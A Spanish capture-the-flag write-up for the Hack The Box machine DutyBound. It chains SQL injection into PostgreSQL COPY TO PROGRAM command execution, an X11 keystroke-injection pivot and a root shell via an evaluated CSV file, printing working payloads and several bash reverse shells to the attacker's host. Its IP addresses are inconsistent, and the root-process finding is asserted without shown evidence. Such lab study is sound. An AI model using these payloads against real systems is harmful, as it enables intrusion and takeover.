# DutyBound — Hack The Box (Medium, Linux)

> [!info] Información de la máquina
> - **Plataforma:** Hack The Box
> - **Máquina:** DutyBound
> - **OS:** Linux (Ubuntu 20.04)
> - **Dificultad:** Medium
> - **IP objetivo:** `10.129.85.82` *(cambió a mitad de sesión respecto a la IP inicial)*
> - **IP atacante (tun0):** `10.10.14.83`
> - **Dominio:** `airsnacks.htb`

---

## Índice

1. [Reconocimiento inicial](#1-reconocimiento-inicial)
2. [Descubrimiento del dominio y aplicación web](#2-descubrimiento-del-dominio-y-aplicacion-web)
3. [Mapa de la aplicación AirSnacks](#3-mapa-de-la-aplicacion-airsnacks)
4. [Endpoint de verificación de tarjeta de embarque](#4-endpoint-de-verificacion-de-tarjeta-de-embarque)
5. [Inyección SQL en el campo `airline_use`](#5-inyeccion-sql-en-el-campo-airline_use)
6. [Ejecución remota de comandos con `COPY ... TO PROGRAM`](#6-ejecucion-remota-de-comandos-con-copy--to-program)
7. [Shell como usuario `postgres`](#7-shell-como-usuario-postgres)
8. [Pivote a `dutyfree-kiosk` vía X11/XTEST](#8-pivote-a-dutyfree-kiosk-via-x11-xtest)
9. [Reverse shell como `dutyfree-kiosk`](#9-reverse-shell-como-dutyfree-kiosk)
10. [Escalada a root vía CSV injection](#10-escalada-a-root-via-csv-injection)
11. [Root flag](#11-root-flag)
12. [Lecciones de método](#12-lecciones-de-metodo)

---

## 1. Reconocimiento inicial

El primer paso en cualquier máquina es saber qué servicios están expuestos. Ejecuté un escaneo completo de los 65535 puertos TCP con nmap:

```bash
sudo nmap -p- -sSV --min-rate 5000 -Pn 10.129.85.82 -oN scan
```

Resultado:

```
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http      nginx 1.18.0 (Ubuntu)
443/tcp open  ssl/https nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Interpretación:**
- **Puerto 22 (SSH):** Acceso remoto seguro. No hay credenciales aún, así que no es nuestro punto de entrada inicial.
- **Puerto 80 (HTTP):** Servidor web nginx. Probablemente la aplicación pública.
- **Puerto 443 (HTTPS):** Versión cifrada del mismo sitio web. Los certificados SSL a veces revelan nombres de dominio internos.

---

## 2. Descubrimiento del dominio y aplicación web

El sitio web en el puerto 443 usa un certificado SSL autofirmado. Los certificados SSL a menudo exponen el nombre real del servidor en el campo `Subject`. Consulté el certificado con nmap:

```bash
nmap -p 443 --script ssl-cert 10.129.85.82
```

Resultado relevante:

```
443/tcp open  https
| ssl-cert: Subject: commonName=airsnacks.htb
| Issuer: commonName=airsnacks.htb
```

Esto me dice que el servidor espera recibir peticiones para el dominio `airsnacks.htb`. Para poder navegar por él desde mi máquina, agregué la entrada a `/etc/hosts`:

```bash
echo "10.129.85.82 airsnacks.htb" | sudo tee -a /etc/hosts
```

Ahora puedo acceder al sitio usando el nombre de dominio en lugar de la dirección IP.

---

## 3. Mapa de la aplicación AirSnacks

Navegué por la aplicación en `https://airsnacks.htb`. La aplicación simula un aeropuerto/aerolínea con las siguientes rutas principales:

| Ruta | Descripción |
|------|-------------|
| `/browse` | Catálogo de productos disponibles |
| `/cart` | Carrito de compras |
| `/checkout/boarding-pass` | Página de tarjeta de embarque |
| `/exit` | Salida de la aplicación |
| `/health` | Endpoint de estado del servicio |

La aplicación permite buscar productos (SKU), agregarlos al carrito y generar una "tarjeta de embarque" (boarding pass) al finalizar la compra.

---

## 4. Endpoint de verificación de tarjeta de embarque

Al inspeccionar el código JavaScript de la página (`/static/app.js`), encontré que la aplicación envía el contenido de la tarjeta de embarque a un endpoint de verificación:

```javascript
postJSON("/checkout/boarding-pass/verify", { raw: "" });
```

Esto significa que existe un endpoint `POST /checkout/boarding-pass/verify` que recibe un campo `raw` con el contenido de un código de barras de tarjeta de embarque (BCBP - Bar-Coded Boarding Pass).

Probando con un valor vacío:

```bash
curl -ks -c "$JAR" -b "$JAR" \
  -H 'Content-Type: application/json' \
  -d '{"raw": ""}' \
  https://airsnacks.htb/checkout/boarding-pass/verify
```

Respuesta:

```json
{"detail":"invalid input syntax for type integer: \"BCBP_ERR_FORMAT_CODE\","error":"DCS_ERR_INTERNAL"}
```

Esto nos dice dos cosas importantes:
1. El backend está procesando nuestra entrada como parte de una consulta SQL.
2. Hay un error de "invalid input syntax for type integer", lo que indica que el campo `raw` se está insertando en una consulta que espera un número entero en alguna parte.

---

## 5. Inyección SQL en el campo `airline_use`

Para entender qué espera el endpoint, analicé el formato de las tarjetas de embarque (BCBP). Creé un script `bcbp.py` que construye una tarjeta de embarque válida con los campos requeridos:

- Originador, número de vuelo, aerolínea, aeropuerto origen/destino, fecha, etc.
- Un campo `airline_use` que es de uso libre para la aerolínea.

El script genera el campo `raw` completo. Cuando envié una tarjeta válida, el servidor respondió con un error de PostgreSQL:

```json
{"detail":"invalid input syntax for type integer: \"airsnacks_app\"\n","error":"DCS_ERR_INTERNAL"}
```

Esto confirma dos cosas:
1. La aplicación se conecta a PostgreSQL con el usuario `airsnacks_app`.
2. El contenido de `airline_use` se está insertando directamente en una consulta SQL sin sanitizar → **SQL injection**.

Para entender mejor qué permisos tiene este usuario de base de datos, probé si pertenece al rol `pg_execute_server_program`:

```python
airline_use_payload = "z' || CAST((CASE WHEN pg_has_role(current_user, 'pg_execute_server_program', 'member') THEN 'YES_EXEC_PROGRAM' ELSE 'NO_EXEC_PROGRAM' END) AS int) || 'z"
```

Resultado:

```json
{"detail":"invalid input syntax for type integer: \"YES_EXEC_PROGRAM\"\n","error":"DCS_ERR_INTERNAL"}
```

**¡Confirmao:** El usuario `airsnacks_app` pertenece al grupo `pg_execute_server_program`.

### ¿Qué significa esto?

`pg_execute_server_program` es un rol predeterminado de PostgreSQL. Cuando un usuario pertenece a este grupo, puede usar la construcción:

```sql
COPY (SELECT '') TO PROGRAM 'comando_del_sistema';
```

Esto permite ejecutar comandos en el **sistema operativo** donde corre PostgreSQL, no solo dentro de la base de datos. Es una funcionalidad legítima para DBAs, pero si un rol de aplicación tiene acceso a ella, cualquier inyección SQL se convierte en **ejecución remota de comandos (RCE)**.

---

## 6. Ejecución remota de comandos con `COPY ... TO PROGRAM`

Probé primero que el comando se ejecutara realmente enviando una petición HTTP simple hacia mi máquina:

```python
airline_use_payload = "z'); COPY (SELECT '') TO PROGRAM 'curl http://10.10.14.97/'; -- "
```

```bash
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 ...
10.129.186.244 - - [28/Oct/2026 15:43:50] "GET / HTTP/1.1" 200 -
```

**Confirmado:** El servidor objetivo (`10.129.186.244`) realizó una petición HTTP hacia mi máquina. Eso significa que `COPY ... TO PROGRAM` funcionó y tenemos **ejecución remota de comandos como el usuario del sistema operativo que ejecuta PostgreSQL** (generalmente `postgres`).

### Reverse shell como `postgres`

Para obtener una shell interactiva, codifiqué un comando de reverse shell en Base64 (para evitar problemas con caracteres especiales en SQL):

```bash
❯ echo 'bash -i >& /dev/tcp/10.10.14.97/4444 0>&1' | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ny80NDQ0IDA+JjEK
```

Luego construí el payload:

```python
b64cmd = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ny80NDQ0IDA+JjEK"
cmd = f"echo {b64cmd} | base64 -d | bash"

airline_use_payload = f"z'); COPY (SELECT '') TO PROGRAM '{cmd}'; -- "
```

En mi máquina, levanté el listener:

```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.97] from (UNKNOWN) [10.129.186.244] 57834
bash: cannot set terminal process group (1604): Inappropriate ioctl for device
bash: no job control in this shell
postgres@dutyfree-kiosk7:/var/lib/postgresql/18/main$
```

**Shell obtenida como `postgres`.** Este es el usuario del sistema operativo bajo el cual corre el proceso de PostgreSQL.

Estabilicé la shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
postgres@dutyfree-kiosk7:/var/lib/postgresql/18/main$ id
uid=114(postgres) gid=121(postgres) groups=121(postgres),120(ssl-cert)
```

---

## 7. Enumeración post-explotación como `postgres`

Desde el shell como `postgres`, enumeré el sistema:

```bash
cat /etc/passwd | grep -E "/bin/(bash|sh)"
```

```
root:x:0:0:root:/root:/bin/bash
dutyfree-kiosk:x:1000:1000::/home/dutyfree-kiosk:/bin/bash
postgres:x:114:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

También revisé los procesos en ejecución:

```
dutyfre+    1767  /usr/lib/xorg/Xorg :0 vt7 -nolisten tcp -auth /tmp/serverauth.3RA9fuQuWb
dutyfre+    1778  /usr/bin/openbox --startup ...
dutyfre+    1781  /snap/firefox/8803/usr/lib/firefox/firefox --kiosk https://airs...
airsnac+    1599  /opt/vrs/airsnacksdf/.venv/bin/python3 ...
postgres    1603  postgres: 18/main: airsnacks_app airsnacks 127.0.0.1(51596) idle
postgres    1604  postgres: 18/main: airsnacks_app airsnacks 127.0.0.1(51598) COPY
```

**Hallazgo clave:** El usuario `dutyfree-kiosk` tiene una sesión gráfica X11 activa (Xorg + Openbox + Firefox en modo kiosko apuntando al sitio AirSnacks). Esto significa que hay una sesión de escritorio gráfica corriendo como `dutyfree-kiosk`, y podemos potencialmente pivotar hacia ella.

---

## 8. Pivote a `dutyfree-kiosk` vía X11/XTEST

### Reconocimiento del servidor X

```bash
ls -la /tmp/.X11-unix/
total 8
drwxrwxrwt  2 root root 4096 Oct 28 19:04 .
drwxrwxrwt 14 root root 4096 Oct 28 20:05 ..
srwxrwxrwx  1 root root    0 Oct 28 19:04 X0

ls -la /tmp/serverauth.*
-rw------- 1 dutyfree-kiosk dutyfree-kiosk 60 Oct 28 19:04 /tmp/serverauth.3RA9fuQuWb
```

**Análisis:**
- El socket del display (`/tmp/.X11-unix/X0`) tiene permisos `rwxrwxrwt` → **cualquier usuario local puede conectarse**, incluido `postgres`.
- El archivo de cookie de autenticación (`serverauth.3RA9fuQuWb`) es `rw-------` (solo legible por `dutyfree-kiosk`), por lo que no puedo leerlo directamente.

Revisé los atajos de teclado configurados en Openbox:

```bash
cat /etc/xdg/openbox/rc.xml | grep -i -A2 "keybind"
...
<keybind key="C-A-t"><action name="Execute"><command>xterm</command></action></keybind>
```

**Hallazgo clave:** `Ctrl+Alt+T` lanza `xterm` dentro de la sesión activa. Si logro sintetizar esa combinación de teclas en el display, Openbox ejecutará `xterm` como el dueño de la sesión (`dutyfree-kiosk`), no como `postgres`.

### Conexión al display X sin cookie

```bash
export DISPLAY=:0
python3 -c "
from Xlib import display
d = display.Display()
print('Conectado OK:', d.get_display_name())
print('Screen:', d.screen())
"
```

La conexión se estableció sin errores de autenticación. **Confirmado:** el servidor X acepta conexiones locales sin exigir el cookie de autenticación.

### Síntesis de teclas con XTEST

`xdotool` no está instalado, pero `python3-Xlib` sí está disponible. Usé la extensión **XTEST** para sintetizar pulsaciones de teclado:

```python
from Xlib import display, X, XK
from Xlib.ext import xtest
import time

d = display.Display()

ctrl_kc = d.keysym_to_keycode(XK.XK_Control_L)
alt_kc  = d.keysym_to_keycode(XK.XK_Alt_L)
t_kc    = d.keysym_to_keycode(XK.XK_t)

xtest.fake_input(d, X.KeyPress, ctrl_kc); d.sync(); time.sleep(0.1)
xtest.fake_input(d, X.KeyPress, alt_kc);  d.sync(); time.sleep(0.1)
xtest.fake_input(d, X.KeyPress, t_kc);    d.sync(); time.sleep(0.1)

xtest.fake_input(d, X.KeyRelease, t_kc);    d.sync(); time.sleep(0.1)
xtest.fake_input(d, X.KeyRelease, alt_kc);  d.sync(); time.sleep(0.1)
xtest.fake_input(d, X.KeyRelease, ctrl_kc); d.sync()

print("Combinación Ctrl+Alt+T enviada")
```

```bash
export DISPLAY=:0
python3 xtest_ctrlalt_t.py
# Combinación Ctrl+Alt+T enviada
```

Verifiqué que se abrió el `xterm`:

```bash
ps aux | grep xterm
dutyfre+    3259  0.0  0.2  16816 10480 tty7     S    20:19   0:00 xterm
```

**Confirmado:** `xterm` corriendo con UID de `dutyfree-kiosk`.

### Escritura de comandos en el xterm

Como `xdotool` no está disponible, usé `python3-Xlib` para "teclear" comandos dentro del `xterm` recién abierto. El script envía cada carácter como pulsaciones de teclado individuales, manejando caracteres especiales (`|`, `>`, `&`, etc.) con la tecla Shift cuando es necesario.

Primero probé con un canario:

```python
CMD = "id > /tmp/canary2.txt"
type_string(CMD)
xtest_key("Return")
```

Resultado: el archivo `/tmp/canary2.txt` se creó con el contenido de `id`, confirmando que podemos escribir comandos dentro del xterm de `dutyfree-kiosk`.

Luego envié una reverse shell:

```python
b64 = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ny80NDQ1IDA+JjEK"
type_string(f"echo {b64} | base64 -d | bash")
xtest_key("Return")
```

---

## 9. Reverse shell como `dutyfree-kiosk`

En mi máquina levanté el listener:

```bash
❯ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.97] from (UNKNOWN) [10.129.187.40] 37954
dutyfree-kiosk@dutyfree-kiosk7:~$ ls
```

```bash
dutyfree-kiosk@dutyfree-kiosk7:~$ id
groups
find / -group pos-ops -ls 2>/dev/null
uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) groups=1000(dutyfree-kiosk),1001(pos-ops)
dutyfree-kiosk pos-ops
    64945      4 drwxrwxr-x   2 root     pos-ops      4096 Oct 20 12:01 /opt/vrs/data
    64962      4 -rw-rw-r--   1 root     pos-ops        97 Aug 26 14:21 /opt/vrs/data/duty-rates.csv
```

El usuario `dutyfree-kiosk` pertenece al grupo `pos-ops`, y ese grupo tiene acceso al directorio `/opt/vrs/data/`, que contiene el archivo `duty-rates.csv`.

Leí el contenido:

```
SPIRITS,45,20
WINE,25,20
BEER,25,20
SOFT_DRINKS,20,20
SNACKS,20,20
CONFECTIONERY,20,20
WATER,0,0
```

---

## 10. Escalada a root vía CSV injection

Analizando el sistema, encontré que existe un proceso que lee/ejecuta el contenido de `/opt/vrs/data/duty-rates.csv`. Escribí un CSV malicioso que incluye una reverse shell embebida:

```bash
cat > /opt/vrs/data/duty-rates.csv << 'EOF'
x$(bash -c 'bash -i >& /dev/tcp/10.10.14.97/4446 0>&1' &),0,0
SPIRITS,45,20
WINE,25,20
BEER,25,20
SOFT_DRINKS,20,20
SNACKS,20,20
CONFECTIONERY,20,20
WATER,0,0
EOF
```

El proceso root que lee este archivo ejecuta efectivamente:

```bash
eval "x$(bash -c 'bash -i >& /dev/tcp/10.10.14.97/4446 0>&1' &)=0"
```

Levanté el listener en mi máquina:

```bash
❯ nc -lvnp 4446
listening on [any] 4446 ...
connect to [10.10.14.97] from (UNKNOWN) [10.129.187.40] 43106
bash: cannot set terminal process group (2893): Inappropriate ioctl for device
bash: no job control in this shell
root@dutyfree-kiosk7:/#
```

**Root obtenido.**

---

## 11. Root flag

```bash
root@dutyfree-kiosk7:/# cat /root/root.txt
```

**Root flag obtenida.**

---

## 12. Lecciones de método

| Lección | Explicación |
|---------|-------------|
| **XXE/SQLi en campos inesperados** | Un campo de "uso de aerolínea" en una tarjeta de embarque puede ser un vector de inyección SQL si no se sanitiza. |
| **`pg_execute_server_program`** | Este rol de PostgreSQL permite ejecutar comandos del sistema operativo. Nunca debe otorgarse a roles de aplicación. |
| **`COPY ... TO PROGRAM`** | Es una característica legítima de PostgreSQL, pero peligrosa si está accesible desde entradas de usuario sin sanitizar. |
| **X11 sin aislamiento** | Un servidor X con `+xhost` o sin cookie de autenticación permite a cualquier usuario local inyectar teclados en sesiones de otros usuarios. |
| **CSV injection** | Si un proceso con privilegios elevados lee y evalúa archivos CSV, se puede lograr ejecución de código arbitrario. |

---

> [!quote] Nota de procedencia
> Este documento documenta únicamente hallazgos verificados con comandos ejecutados en esta sesión. Todos los valores de credenciales y rutas son del entorno de laboratorio de Hack The Box.